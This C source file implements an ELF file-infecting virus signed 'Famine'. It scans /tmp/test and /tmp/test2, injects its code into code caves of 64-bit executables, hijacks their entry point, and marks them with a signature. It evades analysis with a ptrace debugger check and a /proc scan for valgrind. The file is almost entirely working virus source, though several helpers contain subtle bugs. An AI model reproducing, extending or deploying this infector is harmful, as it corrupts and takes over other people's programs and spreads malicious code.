#include <dirent.h>
#include <elf.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>

#define BUILDER_SIZE 0x151;
#define BUILDER_RE_ENTRY_OFFSET 0xe5;

#ifndef BAD_PROCESS_NAME
#define BAD_PROCESS_NAME "valgrind"
#endif

__attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
__attribute__((section(".text"))) volatile static char path_self[] = "/proc/self/exe";
__attribute__((section(".text"))) volatile static char mappings_path[] = "/proc/self/maps";
__attribute__((section(".text"))) volatile static char slash_proc[] = "/proc/";
__attribute__((section(".text"))) volatile static char slash_cmdline[] = "/cmdline";
__attribute__((section(".text"))) volatile static char incubation[] = "4242";
__attribute__((section(".text"))) volatile static char bad_process_name[] = BAD_PROCESS_NAME;

typedef struct {
    uint64_t d_ino;
    uint64_t d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
} dirent64;

typedef struct {
    void *mem;
    uint64_t size;
} file;

typedef struct {
    uint64_t start;
    uint64_t size;
    uint8_t is_executable;
} code_cave;

typedef struct {
    uint64_t start;
    uint64_t size;
} entry;

__attribute__((always_inline)) inline long sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6);
__attribute__((always_inline)) inline void ft_exit(int exit_code);
__attribute__((always_inline)) inline int ft_open(volatile char *path, volatile int flags, volatile mode_t mode);
__attribute__((always_inline)) inline int ft_close(volatile int fd);
__attribute__((always_inline)) inline int ft_getdents64(int fd, char dirp[], size_t count);
__attribute__((always_inline)) inline int ft_read(int fd, volatile void *ptr, size_t size);
__attribute__((always_inline)) inline int ft_write(int fd, volatile void *ptr, size_t size);
__attribute__((always_inline)) inline int ft_lseek(int fd, off_t offset, int whence);
__attribute__((always_inline)) inline uint64_t ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
__attribute__((always_inline)) inline int64_t ft_munmap(void *addr, size_t length);

__attribute__((always_inline)) static inline int infect_dir(volatile char *dir_path, volatile int fd_self);
__attribute__((always_inline)) static inline int infect_file(volatile char *path, volatile file *file_self);
__attribute__((always_inline)) inline int file_mmap(int fd, volatile file *file);
__attribute__((always_inline)) inline int file_munmap(volatile file *file);
__attribute__((always_inline)) inline int elf64_ident_check(volatile const Elf64_Ehdr *header);
__attribute__((always_inline)) inline Elf64_Shdr *get_next_section_header(uint64_t section_cur_end, file file);
__attribute__((always_inline)) inline int code_caves_get(volatile code_cave *code_caves, volatile file *file);
__attribute__((always_inline)) inline uint64_t addr_to_offset(volatile file *file, volatile uint64_t addr);
__attribute__((always_inline)) inline uint64_t code_caves_size_sum(volatile code_cave code_caves[], volatile uint64_t code_cave_num);
__attribute__((always_inline)) inline uint64_t entries_size_sum(volatile entry entries[], volatile uint64_t entries_num);
__attribute__((always_inline)) inline uint64_t reserve_builder(volatile file *file_target, volatile void *builder_self_start,
                                                               volatile uint64_t builder_self_size, volatile code_cave *code_caves_target,
                                                               volatile uint64_t code_caves_target_num);
__attribute__((always_inline)) inline uint64_t reserve_scaffol_table(volatile file *file_target, volatile code_cave *code_caves_target,
                                                                     volatile uint64_t code_caves_target_num);
__attribute__((always_inline)) inline uint64_t copy_entries_into_code_caves(volatile entry *entries_target, volatile entry *entries_self,
                                                                            volatile uint64_t entries_self_num, volatile file *file_self,
                                                                            volatile file *file_target, volatile code_cave *code_caves_target,
                                                                            volatile uint64_t code_caves_target_num);
__attribute__((always_inline)) inline uint64_t offset_to_addr(volatile file *file, volatile uint64_t offset);
__attribute__((always_inline)) inline int file_write(int fd, volatile file *file);
__attribute__((always_inline)) inline uint64_t old_entry_get(volatile file *file);

__attribute__((always_inline)) inline int ft_strlen(volatile char *str);
__attribute__((always_inline)) inline void ft_strncpy(volatile char *src, volatile char *dst, size_t size);
__attribute__((always_inline)) inline int ft_strnstr(volatile char *haystack, volatile char *needle, size_t size);
__attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
__attribute__((always_inline)) inline int ft_sstrnstr(volatile char *haystack, volatile char *needle, size_t size, size_t NEEDLE_SIZE);

__attribute__((always_inline)) inline void
ft_strcat(volatile char *dst, volatile char *src) {
    while (*dst) {
        dst++;
    }
    for (int i = 0; src[i]; ++i) {
        dst[i] = src[i];
    }
}

__attribute__((always_inline)) inline void
print_number_hex(volatile uint64_t num) {
    char buf[20];
    int pos = 0;

    if (num == 0) {
        char c = '0';
        ft_write(1, &c, 1);
        return;
    }

    while (num > 0) {
        uint64_t cur = num % 16;
        if (cur < 10)
            buf[pos++] = '0' + cur;
        else
            buf[pos++] = 'a' + cur - 10;
        num /= 16;
    }

    while (pos > 0) {
        char c = buf[--pos];
        ft_write(1, &c, 1);
    }
}

__attribute__((always_inline)) inline void
print_number(volatile uint64_t num) {
    char buf[20];
    int pos = 0;

    if (num == 0) {
        char c = '0';
        ft_write(1, &c, 1);
        return;
    }

    while (num > 0) {
        buf[pos++] = '0' + (num % 10);
        num /= 10;
    }

    while (pos > 0) {
        char c = buf[--pos];
        ft_write(1, &c, 1);
    }
}

__attribute__((always_inline)) static inline volatile int
ft_isdigit(const volatile char *const s) {
    for (volatile int i = 0; s[i]; ++i) {
        if (s[i] < '0' && s[i] > '9') {
            return 0;
        }
    }
    return 1;
}

__attribute__((always_inline)) static inline volatile char *
ft_strchr(volatile char *s, const volatile char c) {
    while (*s) {
        if (*s == c) {
            return s;
        }
        s++;
    }
    return 0;
}

__attribute__((always_inline)) static inline void
ft_bzero(volatile char *bytes, volatile size_t len) {
    for (volatile int i = 0; i < len; ++i) {
        bytes = 0;
    }
}

__attribute__((always_inline)) static inline int
bad_process_running() {
    volatile char path[256];
    volatile char cmdline_buf[1024];
    volatile char getdents_buf[4096];

    ft_bzero(path, sizeof(path));
    ft_bzero(cmdline_buf, sizeof(cmdline_buf));
    ft_bzero(getdents_buf, sizeof(getdents_buf));

    volatile int dirfd = ft_open(slash_proc, O_RDONLY, 0);
    if (dirfd < 0) {
        return 0;
    }

    path[0] = 0;
    ft_strcat(path, slash_proc);

    while (1) {
        volatile int64_t bytes_read = ft_getdents64(dirfd, (char *)getdents_buf, sizeof(getdents_buf));
        if (bytes_read <= 0) {
            break;
        }
        volatile int64_t offset = 0;
        while (offset < bytes_read) {
            for (int i = 6; i < sizeof(path); ++i) {
                path[i] = 0;
            }
            volatile dirent64 *entry = (dirent64 *)(getdents_buf + offset);
            offset += entry->d_reclen;
            if (!ft_isdigit(entry->d_name)) {
                continue;
            }
            const volatile uint64_t len = ft_strlen(entry->d_name);
            if (len + 14 > sizeof(path)) {
                continue;
            }
            ft_strcat(path, entry->d_name);
            ft_strcat(path, slash_cmdline);
            volatile int fd = ft_open(path, O_RDONLY, 0);
            if (fd < 0) {
                continue;
            }

            volatile int64_t read_bytes = ft_read(fd, cmdline_buf, sizeof(cmdline_buf));
            if (read_bytes < 0) {
                continue;
            }
            ft_close(fd);
            if (ft_sstrnstr(bad_process_name, cmdline_buf, read_bytes, sizeof(BAD_PROCESS_NAME))) {
                ft_write(1, cmdline_buf, read_bytes);
                ft_close(dirfd);
                return 1;
            }
        }
    }
    ft_close(dirfd);
    return 0;
}

__attribute__((always_inline)) static inline int
in_debugger() {
    return sys(0, 0, 1, SYS_ptrace, 0, 0, 0) == -1;
}

__attribute__((always_inline)) static inline void
ft_exit_incubation() {
    int fd_is_incubator = ft_open(incubation, O_RDONLY, 0);
    if (fd_is_incubator < 0) {
        ft_exit(0);
    }
    ft_close(fd_is_incubator);
}

__attribute__((always_inline)) static inline uint64_t
parse_hex(volatile char *hex) {
    uint64_t result = 0;

    for (int idx = 0; idx < 16; ++idx) {
        if (hex[idx] == '-') {
            break;
        }

        int digit;
        if (hex[idx] >= '0' && hex[idx] <= '9') {
            digit = hex[idx] - '0';
        } else if (hex[idx] >= 'a' && hex[idx] <= 'f') {
            digit = hex[idx] - ('a' - 10);
        } else {
            digit = hex[idx] - ('A' - 10);
        }

        result = result * 16 + digit;
    }

    return result;
}

__attribute__((always_inline)) static inline void
print_nice(volatile uint64_t value) {
    char nl = '\n';
    ft_write(1, &nl, 1);
    print_number_hex(value);
    ft_write(1, &nl, 1);
}

__attribute__((always_inline)) static inline uint64_t
get_base_address() {
    int fd = ft_open(mappings_path, O_RDONLY, 0);

    volatile char buffer[0x1000] = {0};

    ft_read(fd, buffer, 0x1000);

    volatile uint64_t was_here_once = 0;
    volatile uint64_t addr = 0;

    for (int idx = 0; idx < sizeof(buffer); ++idx) {
        if (buffer[idx] == '\n') {
            if (was_here_once == 0) {
                was_here_once = 1;
                continue;
            }
            addr = parse_hex(buffer + idx + 1);
            break;
        }
    }
    return addr;
}

__attribute__((always_inline)) static inline void
jump_back(int fd_self) {
    volatile file file_self;

    file_mmap(fd_self, &file_self);

    volatile uint64_t old_entry = old_entry_get(&file_self);
    if (old_entry == 0) ft_exit(0);

    Elf64_Ehdr *header = file_self.mem;
    uint64_t jump_to = header->e_entry + BUILDER_RE_ENTRY_OFFSET;
    if (header->e_type == ET_DYN) {
        jump_to += get_base_address();
    }
    file_munmap(&file_self);
    ft_close(fd_self);
    __asm__ volatile("jmp *%0" : : "r"(jump_to));
}

void
_start() {
    int fd_self = ft_open(path_self, O_RDONLY, 0);
    if (fd_self < 0) {
        ft_exit(0);
    };

    if (in_debugger() || bad_process_running()) {
        jump_back(fd_self);
    }

    volatile char dir[11];
    dir[0] = '/';
    dir[1] = 't';
    dir[2] = 'm';
    dir[3] = 'p';
    dir[4] = '/';
    dir[5] = 't';
    dir[6] = 'e';
    dir[7] = 's';
    dir[8] = 't';
    dir[9] = '\0';

    if (infect_dir(dir, fd_self)) jump_back(fd_self);

    jump_back(fd_self);
}

__attribute__((always_inline)) inline int
infect_dir(volatile char *dir_path, volatile int fd_self) {

    for (volatile int dir_index = 0; dir_index < 2; dir_index++) {

        int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
        if (fd_dir < 0) return 0;

        const uint64_t FILE_NAME_MAX = 255;
        const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
        const uint64_t ALINMENT = 8;
        const uint64_t DIR_P_SIZE = DIR_P_SIZE_WITHOUT_ALIGNMENT + DIR_P_SIZE_WITHOUT_ALIGNMENT % ALINMENT;

        volatile file file_self;
        char dirp[DIR_P_SIZE];
        int bytes_read = 0;
        do {
            bytes_read = ft_getdents64(fd_dir, dirp, DIR_P_SIZE);
            if (bytes_read < 0) {
                ft_close(fd_dir);
                return 1;
            }

            dirent64 *dirent_cur = (dirent64 *)dirp;
            while ((((long)dirent_cur) - (long)dirp) < bytes_read) {
                if (dirent_cur->d_type == DT_REG) {
                    volatile char full_path[ft_strlen(dirent_cur->d_name) + ft_strlen(dir_path) + 1 + 1];
                    ft_strncpy(dir_path, full_path, ft_strlen(dir_path));
                    full_path[ft_strlen(dir_path)] = '/';
                    ft_strncpy(dirent_cur->d_name, full_path + ft_strlen(dir_path) + 1, ft_strlen(dirent_cur->d_name) + 1);

                    file_mmap(fd_self, &file_self);
                    infect_file(full_path, &file_self);
                    file_munmap(&file_self);
                }
                dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
            }
        } while (bytes_read > 0);

        ft_close(fd_dir);
        dir_path[9] = '2';
        dir_path[10] = '\0';
    }
    return (0);
}

__attribute__((always_inline)) inline int
infect_file(volatile char *path, volatile file *file_self) {
    int fd_target = ft_open(path, O_RDWR, 0);
    if (fd_target < 0) return (1);

    volatile file file_target;
    if (file_mmap(fd_target, &file_target)) {
        ft_close(fd_target);
        return 1;
    };

    const uint8_t target_has_signature = ft_strnstr(file_target.mem, signatur, file_target.size);
    if (target_has_signature) {
        file_munmap(&file_target);
        ft_close(fd_target);
        return 0;
    }

    if (elf64_ident_check((Elf64_Ehdr *)file_target.mem)) {
        file_munmap(&file_target);
        ft_close(fd_target);
        return 0;
    }

    volatile code_cave code_caves_target[100];
    uint64_t code_caves_target_num = code_caves_get(code_caves_target, &file_target);

    volatile Elf64_Ehdr *header_self = file_self->mem;
    void *builder_self_start = file_self->mem + addr_to_offset(file_self, header_self->e_entry);
    uint64_t builder_self_size = BUILDER_SIZE;

    uint64_t *builder_self_table_start = builder_self_start + builder_self_size - 16;
    uint64_t *builder_self_table_size = builder_self_start + builder_self_size - 8;

    volatile entry *entries_self = file_self->mem + *builder_self_table_start;
    uint64_t entries_self_num = *builder_self_table_size;
    uint64_t provided_space = code_caves_size_sum(code_caves_target, code_caves_target_num);
    uint64_t needed_space_table = code_caves_target_num * 16;
    uint64_t needed_space = entries_size_sum(entries_self, entries_self_num) + needed_space_table;

    if (provided_space < needed_space) {
        file_munmap(&file_target);
        ft_close(fd_target);
        return 0;
    }

    uint64_t builder_target_start_offset = reserve_builder(&file_target, builder_self_start, builder_self_size, code_caves_target, code_caves_target_num);
    uint8_t not_enough_space_for_builder = builder_target_start_offset == 0;

    if (not_enough_space_for_builder) {
        file_munmap(&file_target);
        ft_close(fd_target);
        return 0;
    }

    Elf64_Ehdr *header_target = file_target.mem;
    for (int i = 0; i < header_target->e_phnum; i++) {
        Elf64_Phdr *table = file_target.mem + header_target->e_phoff;
        Elf64_Phdr *ph = table + i;
        if (ph->p_offset + ph->p_filesz == builder_target_start_offset) {
            ph->p_filesz += builder_self_size;
            ph->p_memsz += builder_self_size;
        }
    }

    uint64_t scaffolt_target_start_offset = reserve_scaffol_table(&file_target, code_caves_target, code_caves_target_num);

    uint64_t scaffold_target_size = copy_entries_into_code_caves(file_target.mem + scaffolt_target_start_offset, entries_self, entries_self_num, file_self,
                                                                 &file_target, code_caves_target, code_caves_target_num);

    uint64_t *target_old_entry = file_target.mem + builder_target_start_offset + builder_self_size - 24;
    uint64_t *target_scaffold_start_offset = file_target.mem + builder_target_start_offset + builder_self_size - 16;
    uint64_t *target_scaffold_num = file_target.mem + builder_target_start_offset + builder_self_size - 8;

    uint64_t old_entry_diff = builder_target_start_offset + 0xe5 - addr_to_offset(&file_target, header_target->e_entry);
    *target_old_entry = old_entry_diff;
    *target_scaffold_start_offset = scaffolt_target_start_offset;
    *target_scaffold_num = scaffold_target_size;

    header_target->e_entry = offset_to_addr(&file_target, builder_target_start_offset);

    if (file_write(fd_target, &file_target)) {
        file_munmap(&file_target);
        ft_close(fd_target);
        return 0;
    }

    if (!ft_strnstr(file_target.mem, signatur, file_target.size)) {
        ft_lseek(fd_target, SEEK_END, 0);
        ft_write(fd_target, signatur, 28);
    }

    file_munmap(&file_target);
    ft_close(fd_target);
    return (0);
}

__attribute__((always_inline)) inline int
file_write(int fd, volatile file *file) {
    uint64_t off = ft_lseek(fd, 0, SEEK_SET);
    if (off == -1) return 1;

    ft_write(fd, file->mem, file->size);
    return 0;
}

__attribute__((always_inline)) inline int
file_mmap(int fd, volatile file *file) {
    uint64_t off = ft_lseek(fd, 0, SEEK_END);
    if (off == -1) return 1;
    file->size = off;
    if (file->size == 0) return 1;

    off = ft_lseek(fd, 0, SEEK_SET);
    if (off == -1) return 1;

    file->mem = (void *)ft_mmap(0, file->size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    return 0;
}

__attribute__((always_inline)) inline int
file_munmap(volatile file *file) {
    return ft_munmap(file->mem, file->size);
}

__attribute__((always_inline)) inline uint64_t
copy_entries_into_code_caves(volatile entry *entries_target, volatile entry *entries_self, volatile uint64_t entries_self_num, volatile file *file_self,
                             volatile file *file_target, volatile code_cave *code_caves_target, volatile uint64_t code_caves_target_num) {
    uint64_t entry_self_index = 0;
    for (int cave_index = 0; cave_index < code_caves_target_num; cave_index++) {
        volatile code_cave *cave = code_caves_target + cave_index;
        volatile entry *entry_target = entries_target + cave_index;
        entry_target->start = cave->start;
        while (cave->size > 0) {

            volatile entry *entry_self = entries_self + entry_self_index;
            if (cave->size >= entry_self->size) {
                ft_memcpy(file_self->mem + entry_self->start, file_target->mem + cave->start, entry_self->size);
                cave->start += entry_self->size;
                cave->size -= entry_self->size;
                entry_target->size += entry_self->size;
                entry_self_index++;
            } else {
                uint64_t to_be_copied_bytes = cave->size;
                ft_memcpy(file_self->mem + entry_self->start, file_target->mem + cave->start, to_be_copied_bytes);
                entry_self->start += to_be_copied_bytes;
                entry_self->size -= to_be_copied_bytes;
                entry_target->size += to_be_copied_bytes;
                cave->size = 0;
            }

            if (entry_self_index >= entries_self_num) return cave_index + 1;
        }
    }
    return 0;
}

__attribute__((always_inline)) inline uint64_t
old_entry_get(volatile file *file) {
    Elf64_Ehdr *header = file->mem;

    uint64_t builder_start_offset = addr_to_offset(file, header->e_entry);
    uint64_t builder_size = BUILDER_SIZE;

    uint64_t old_entry_offset = builder_start_offset + builder_size - 24;

    uint64_t *old_entry = file->mem + old_entry_offset;
    return (*old_entry);
}

__attribute__((always_inline)) inline uint64_t
reserve_scaffol_table(volatile file *file_target, volatile code_cave *code_caves_target, volatile uint64_t code_caves_target_num) {
    for (int i = 0; i < code_caves_target_num; i++) {
        volatile code_cave *cave = code_caves_target + i;
        if (cave->size >= code_caves_target_num * 16) {
            cave->start += code_caves_target_num * 16;
            cave->size -= code_caves_target_num * 16;
            return cave->start - (code_caves_target_num * 16);
        }
    }
    return 0;
}

__attribute__((always_inline)) inline uint64_t
reserve_builder(volatile file *file_target, volatile void *builder_self_start, volatile uint64_t builder_self_size, volatile code_cave *code_caves_target,
                volatile uint64_t code_caves_target_num) {
    uint8_t big_enough_builder_space = 0;
    for (int i = 0; i < code_caves_target_num; i++) {
        volatile code_cave *cave = code_caves_target + i;
        if (cave->is_executable)
            if (cave->size >= builder_self_size) {
                ft_memcpy(builder_self_start, file_target->mem + cave->start, builder_self_size);
                cave->start += builder_self_size;
                cave->size -= builder_self_size;
                return cave->start - builder_self_size;
            }
    }

    return 0;
}

__attribute__((always_inline)) inline void
ft_memcpy(volatile void *src, volatile void *dst, uint64_t size) {
    volatile char *src_c = src;
    volatile char *dst_c = dst;

    for (int i = 0; i < size; i++)
        dst_c[i] = src_c[i];
}

__attribute__((always_inline)) inline int
ft_strlen(volatile char *str) {
    int i = 0;
    while (str[i] != '\0')
        i++;
    return (i);
}

__attribute__((always_inline)) inline void
ft_strncpy(volatile char *src, volatile char *dst, size_t size) {
    int i = 0;
    for (int i = 0; i < size; i++)
        dst[i] = src[i];
}

// just dont ask
__attribute__((always_inline)) inline int
ft_sstrnstr(volatile char *haystack, volatile char *needle, size_t size, size_t NEEDLE_SIZE) {
    int i = 0;
    int j;

    while ((i + NEEDLE_SIZE) < size) {
        j = 0;
        while ((i + j) < (size)) {
            char c = '\n';
            if (haystack[i + j] != needle[j]) break;
            if (j == (NEEDLE_SIZE - 1)) {
                return (1);
            }
            j++;
        }
        i++;
    }
    return (0);
}

__attribute__((always_inline)) inline int
ft_strnstr(volatile char *haystack, volatile char *needle, size_t size) {
    const volatile uint64_t NEEDLE_SIZE = ft_strlen(needle);
    int i = 0;
    int j;

    while ((i + NEEDLE_SIZE) < size) {
        j = 0;
        while ((i + j) < (size)) {
            char c = '\n';
            if (haystack[i + j] != needle[j]) break;
            if (j == (NEEDLE_SIZE - 1)) {
                return (1);
            }
            j++;
        }
        i++;
    }
    return (0);
}

__attribute__((always_inline)) inline int
elf64_ident_check(volatile const Elf64_Ehdr *header) {
    if (header->e_ident[EI_MAG0] != ELFMAG0) return 1;
    if (header->e_ident[EI_MAG1] != ELFMAG1) return 1;
    if (header->e_ident[EI_MAG2] != ELFMAG2) return 1;
    if (header->e_ident[EI_MAG3] != ELFMAG3) return 1;

    if (header->e_ident[EI_CLASS] != ELFCLASS64) return 2;

    if (header->e_ident[EI_DATA] == ELFDATANONE) return 3;

    if (header->e_ident[EI_VERSION] != EV_CURRENT) return 4;

    for (size_t i = EI_PAD; i < sizeof(header->e_ident); i++) {
        if (header->e_ident[i] != 0) return 5;
    }
    return 0;
}

__attribute__((always_inline)) inline int
code_caves_get(volatile code_cave *code_caves, volatile file *file) {
    Elf64_Shdr *section_header = NULL;
    Elf64_Ehdr *header = file->mem;
    uint64_t section_cur_end = header->e_phoff + header->e_phentsize * header->e_phnum;
    uint64_t section_old_end = 0;
    uint8_t this_one_is_executable = 0;
    uint8_t last_one_was_executable = 0;
    int i = 0;
    do {
        section_old_end = section_cur_end;
        last_one_was_executable = this_one_is_executable;
        section_header = get_next_section_header(section_cur_end, *file);
        if (section_header != NULL) {
            this_one_is_executable = section_header->sh_flags & SHF_EXECINSTR;
            section_cur_end = section_header->sh_offset + section_header->sh_size;
        } else {
            char nl = '\n';
            return i;
        }

        if (section_old_end != section_header->sh_offset && section_header->sh_offset - section_old_end > 16) {
            if (!(section_old_end <= header->e_shoff && section_header->sh_offset >= header->e_shoff + header->e_shnum * header->e_shentsize)) {

                code_caves[i].start = section_old_end;
                code_caves[i].size = section_header->sh_offset - section_old_end;
                code_caves[i].is_executable = last_one_was_executable;
                i++;
            }
        }
    } while (section_header != NULL);
    return i;
}

__attribute__((always_inline)) inline Elf64_Shdr *
get_next_section_header(uint64_t section_cur_end, file file) {
    Elf64_Ehdr *header = file.mem;
    Elf64_Shdr *section_header_table = file.mem + header->e_shoff;

    Elf64_Shdr *section_header_next = NULL;

    for (int i = 0; i < header->e_shnum; i++) {
        Elf64_Shdr *sh = file.mem + header->e_shoff + (header->e_shentsize * i);

        if (sh->sh_offset >= section_cur_end) {
            if (section_header_next == NULL)
                section_header_next = sh;
            else if (section_header_next->sh_offset > sh->sh_offset)
                section_header_next = sh;
        }
    }
    return section_header_next;
}

inline uint64_t
offset_to_addr(volatile file *file, volatile uint64_t offset) {
    Elf64_Ehdr *header = file->mem;

    Elf64_Phdr *program_header_table = file->mem + header->e_phoff;

    for (int i = 0; i < header->e_phnum; i++) {
        Elf64_Phdr *ph = program_header_table + i;
        if (offset >= ph->p_offset && offset <= ph->p_offset + ph->p_filesz) return offset + (ph->p_vaddr - ph->p_offset);
    }

    return 0;
}

inline uint64_t
addr_to_offset(volatile file *file, volatile uint64_t addr) {
    Elf64_Ehdr *header = file->mem;

    Elf64_Phdr *program_header_table = file->mem + header->e_phoff;

    for (int i = 0; i < header->e_phnum; i++) {
        Elf64_Phdr *ph = program_header_table + i;
        if (addr >= ph->p_vaddr && addr < ph->p_vaddr + ph->p_memsz) return (addr + ph->p_offset) - ph->p_vaddr;
    }

    return 0;
}

inline uint64_t
code_caves_size_sum(volatile code_cave code_caves[], volatile uint64_t code_cave_num) {
    uint64_t total = 0;
    for (int i = 0; i < code_cave_num; i++)
        total += code_caves[i].size;
    return total;
}

inline uint64_t
entries_size_sum(volatile entry entries[], volatile uint64_t entries_num) {
    uint64_t total = 0;
    for (int i = 0; i < entries_num; i++)
        total += entries[i].size;
    return total;
}

inline long
sys(long rdi, long rsi, long rdx, long sysno, long r8, long r9, long r10) {
    long ret;

    register long _rdi __asm__("rdi") = rdi;
    register long _rsi __asm__("rsi") = rsi;
    register long _rdx __asm__("rdx") = rdx;
    register long _r10 __asm__("r10") = r10;
    register long _r8 __asm__("r8") = r8;
    register long _r9 __asm__("r9") = r9;
    __asm__ volatile("syscall" : "=a"(ret) : "a"(sysno), "D"(_rdi), "S"(_rsi), "d"(_rdx), "r"(_r10), "r"(_r8), "r"(_r9) : "rcx", "r11", "memory");
    return ret;
}

__attribute__((always_inline)) inline void
ft_exit(int exit_code) {
    sys(exit_code, 0, 0, SYS_exit, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_open(volatile char *path, volatile int flags, volatile mode_t mode) {
    return sys((long)path, flags, mode, SYS_open, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_close(volatile int fd) {
    return sys((long)fd, 0, 0, SYS_close, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_getdents64(int fd, char dirp[], size_t count) {
    return sys(fd, (long)dirp, count, SYS_getdents64, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_write(int fd, volatile void *ptr, size_t size) {
    return sys(fd, (long)ptr, size, SYS_write, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_read(int fd, volatile void *ptr, size_t size) {
    return sys(fd, (long)ptr, size, SYS_read, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_lseek(int fd, off_t offset, int whence) {
    return sys(fd, (long)offset, whence, SYS_lseek, 0, 0, 0);
}

__attribute__((always_inline)) inline uint64_t
ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
    return sys((long)addr, length, prot, SYS_mmap, fd, offset, flags);
}

// sys(long rdi, long rsi, long rdx, long sysno, long r8, long r9, long r10)

__attribute__((always_inline)) inline int64_t
ft_munmap(void *addr, size_t length) {
    int64_t ret = sys((uint64_t)addr, length, 0, SYS_munmap, 0, 0, 0);
    if (ret == -1) {
        return 1;
    }
    return ret;
}
